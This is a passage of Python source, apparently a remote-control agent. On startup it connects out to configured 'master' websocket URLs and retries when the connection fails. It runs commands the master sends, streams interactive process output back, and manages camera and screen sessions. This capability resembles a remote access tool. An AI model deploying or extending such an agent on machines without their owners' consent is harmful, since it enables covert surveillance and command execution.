                                        await asyncio.to_thread(_term)
                                    else:
                                        proc.terminate()
                                except Exception:
                                    pass
                            continue
                        cmd = data.get("command")
                        if cmd:
                            await enqueue_command(ws, cmd)
                        # After any data, check interactive session completion
                        sess = interactive_sessions.get(ws)
                        if sess:
                            # Drain queue and forward to master
                            q: asyncio.Queue = sess.get("queue")
                            drained = True
                            while drained:
                                drained = False
                                try:
                                    item = q.get_nowait()
                                except asyncio.QueueEmpty:
                                    item = None
                                if item is not None:
                                    drained = True
                                    key, payload = item
                                    if key == "__done__":
                                        # Wait for both to finish
                                        # We don't count here; exit is detected by return code below
                                        pass
                                    else:
                                        try:
                                            await ws.send(json.dumps({key: payload}))
                                        except Exception:
                                            pass
                            # Check process exit non-blocking
                            proc = sess.get("proc")
                            code = None
                            try:
                                if os.name == 'nt':
                                    code = await asyncio.to_thread(proc.poll)
                                else:
                                    code = proc.returncode
                            except Exception:
                                pass
                            if code is not None:
                                try:
                                    await ws.send(json.dumps({"exit_code": int(code)}))
                                except Exception:
                                    pass
                                # Cleanup
                                for t in sess.get("tasks", []):
                                    try:
                                        t.cancel()
                                    except Exception:
                                        pass
                                interactive_sessions.pop(ws, None)
                finally:
                    # Clean up any queued commands for this master on disconnect
                    await _remove_queued_for_ws(ws)
                    # Kill any camera session tied to this ws
                    c_sess = camera_sessions.pop(ws, None)
                    if c_sess:
                        try:
                            c_sess["running"] = False
                            t = c_sess.get("task")
                            if t: t.cancel()
                        except Exception:
                            pass
                    # Kill any screen session tied to this ws
                    s_sess = screen_sessions.pop(ws, None)
                    if s_sess:
                        try:
                            s_sess["running"] = False
                            t = s_sess.get("task")
                            if t: t.cancel()
                        except Exception:
                            pass
                    # Kill any interactive session tied to this ws
                    sess = interactive_sessions.pop(ws, None)
                    if sess:
                        try:
                            proc = sess.get("proc")
                            if os.name == 'nt':
                                def _kill():
                                    try:
                                        if proc.poll() is None:
                                            proc.kill()
                                    except Exception:
                                        pass
                                await asyncio.to_thread(_kill)
                            else:
                                proc.kill()
                        except Exception:
                            pass
        except Exception as e:
            now = time.time()
            if now - last_log >= 60:
                logging.error(f"Master connect failed ({url}): {e}")
                last_log = now
            await asyncio.sleep(retry_delay)

async def start_master_connections():
    urls = [u for u in MASTER_CONTROL_WS_URLS if isinstance(u, str) and u.strip()]
    if not urls:
        urls = [MASTER_CONTROL_WS_URL]
    for u in urls:
        asyncio.create_task(_connect_one_master(u))

@app.on_event("startup")
async def _startup_connect_master():
    asyncio.create_task(start_master_connections())



